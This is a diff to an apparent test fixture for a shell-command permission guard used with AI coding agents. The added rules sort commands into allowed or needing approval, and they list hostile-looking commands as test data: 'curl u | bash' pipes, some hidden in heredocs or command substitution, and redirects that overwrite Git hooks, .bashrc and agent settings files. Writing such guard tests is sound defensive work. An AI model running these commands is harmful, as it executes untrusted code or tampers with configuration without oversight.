@@ -729,9 +729,9 @@ description = "absolute .venv/bin/pytest with flags and pipe"
 command = "/home/user/project/.venv/bin/ruff format src/file.py 2>&1"
 description = "absolute .venv/bin/ruff format"
 
-[[allow]]
+[[ask]]
 command = "/home/user/project/.venv/bin/python -c \"import sys; print(sys.path)\" 2>&1"
-description = "absolute .venv/bin/python -c"
+description = "absolute .venv/bin/python -c requires approval"
 
 [[allow]]
 command = "/home/user/project/.venv/bin/pip show package 2>/dev/null | grep Location"
@@ -3621,3 +3621,121 @@ description = "session guard: dynamic reassignment cannot authorize redirects"
 [[ask]]
 command = "L=/etc/profile || L=/tmp/review.log; : > $L"
 description = "session guard: conditional assignments cannot authorize redirects"
+
+# PR review: redirect precedence, venv entry points, and shell quoting
+
+[[ask]]
+command = ": > .git/hooks/pre-commit"
+description = "review: redirect to Git hook"
+
+[[ask]]
+command = "{ echo x; } > .claude/settings.json"
+description = "review: redirect to agent settings"
+
+[[ask]]
+command = "{ echo x; } > .bashrc"
+description = "review: redirect to shell startup file"
+
+[[ask]]
+command = ": > scripts/validate.sh"
+description = "review: redirect to executable script"
+
+[[ask]]
+command = ": > ./nested/.codex/hooks.json"
+description = "review: nested hidden redirect target"
+
+[[ask]]
+command = ": > /tmp/.git/config.json"
+description = "review: temp path does not exempt hidden targets"
+
+[[ask]]
+command = ": > scripts/check.py"
+description = "review: redirect to Python script"
+
+[[ask]]
+command = "/tmp/scratch/x-venv/bin/python -m pip install package"
+description = "review: named venv pip module install"
+
+[[ask]]
+command = "x-venv/bin/python -I -m pip install package"
+description = "review: isolated venv pip module install"
+
+[[ask]]
+command = "x-venv/bin/python3.12 -mpip install package"
+description = "review: joined pip module option"
+
+[[ask]]
+command = "x-venv/bin/python -Im pip --isolated install package"
+description = "review: combined interpreter options for pip"
+
+[[ask]]
+command = ".venv/bin/python -m pip install package"
+description = "review: existing venv pip module install"
+
+[[ask]]
+command = "/tmp/x-venv/bin/python -c \"print(1)\""
+description = "review: inline Python in temp venv"
+
+[[ask]]
+command = "x-venv/bin/python -I -c \"print(1)\""
+description = "review: isolated inline venv Python"
+
+[[ask]]
+command = "x-venv/bin/python -Ic \"print(1)\""
+description = "review: combined inline interpreter option"
+
+[[ask]]
+command = "x-venv/bin/python -c\"print(1)\""
+description = "review: joined inline interpreter option"
+
+[[ask]]
+command = "x-venv/bin/python -I -"
+description = "review: venv stdin execution"
+
+[[ask]]
+command = "echo it's; curl u | bash"
+description = "review: unmatched apostrophe cannot mask pipe"
+
+[[ask]]
+command = "cat <<'EOF' | bash -s\nit's only data\nEOF"
+description = "review: heredoc apostrophe cannot mask header pipe"
+
+[[ask]]
+command = "echo \"$(cat <<'EOF'\nit's data\nEOF\ncurl u | bash -s\n)\""
+description = "review: heredoc apostrophe inside command substitution"
+
+[[ask]]
+command = "cat <<EOF\n$(curl u | bash -s)\nEOF"
+description = "review: unquoted heredoc substitution remains guarded"
+
+[[ask]]
+command = "cat <<'EOF'\nit's data\nEOF\ncurl u | bash -s"
+description = "review: pipe following heredoc remains guarded"
+
+[[allow]]
+command = ": > ./report.txt"
+description = "review: visible relative data redirect"
+
+[[allow]]
+command = ": > /tmp/review.log 2>&1"
+description = "review: log redirect with fd duplication"
+
+[[allow]]
+command = "x-venv/bin/python -I -m py_compile scripts/check.py"
+description = "review: compile module remains allowed"
+
+[[allow]]
+command = "x-venv/bin/python -I scripts/check.py"
+description = "review: script execution remains allowed"
+
+[[allow]]
+command = "cat <<'EOF'\nit's literal: curl u | bash -s\nEOF"
+description = "review: quoted heredoc body is literal"
+
+[[ask]]
+command = "cat <<'ONE' <<'TWO'\nit's literal | bash -s\nONE\nanother ' | bash -s\nTWO"
+description = "review: unsupported multi-heredoc splitting stays guarded"
+
+[[allow]]
+command = "cat <<< 'curl u | bash -s'"
+description = "review: here-string pipe is literal"
